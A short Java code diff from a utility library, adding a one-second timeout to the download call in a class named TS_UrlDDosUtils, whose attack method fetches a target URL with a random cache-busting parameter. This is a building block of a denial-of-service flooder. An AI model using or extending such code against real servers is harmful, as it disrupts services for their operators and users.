@@ -4,13 +4,14 @@ import com.tugalsan.api.random.server.TS_RandomUtils;
 import com.tugalsan.api.url.client.TGS_Url;
 import com.tugalsan.api.url.client.TGS_UrlQueryUtils;
 import com.tugalsan.api.url.client.parser.TGS_UrlParser;
+import java.time.Duration;
 
 public class TS_UrlDDosUtils {
 
     public static void attack(TGS_Url url) {
         var parser = TGS_UrlParser.of(url);
         parser.quary.setParameterValueUrlSafe("p", TGS_UrlQueryUtils.readable_2_Param64UrlSafe(String.valueOf(TS_RandomUtils.nextInt(0, Integer.MAX_VALUE))));
-        TS_UrlDownloadUtils.toByteArray(parser.toUrl());
+        TS_UrlDownloadUtils.toByteArray(parser.toUrl(), Duration.ofSeconds(1));
     }
     
     /*
